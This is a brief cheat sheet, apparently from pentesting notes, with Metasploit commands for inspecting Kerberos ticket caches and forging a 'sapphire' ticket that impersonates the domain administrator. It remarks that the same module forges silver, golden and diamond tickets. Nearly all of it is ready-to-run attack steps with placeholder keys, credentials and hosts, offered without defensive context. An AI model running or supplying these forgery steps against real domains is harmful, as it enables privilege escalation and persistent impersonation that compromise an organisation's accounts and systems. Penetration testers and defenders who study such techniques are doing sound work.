# Metasploit - Kerberos Tickets

### 1) Ticket Inspection

    use auxiliary/admin/kerberos/inspect_ticket

Execution

    set TICKET_PATH /home/user/administrator.ccache
    run

### 2) Sapphire Ticket

This module can be used to forge silver, golden and diamond tickets as well!

    use admin/kerberos/forge_ticket

Execution

    set ACTION FORGE_SAPPHIRE
    set AES_KEY AES_KEY
    set USER administrator
    set DOMAIN domain.local
    set REQUEST_USER LOW_PRIV_USER
    set REQUEST_PASSWORD LOW_PRIV_PASSWORD
    set RHOSTS IP
    run

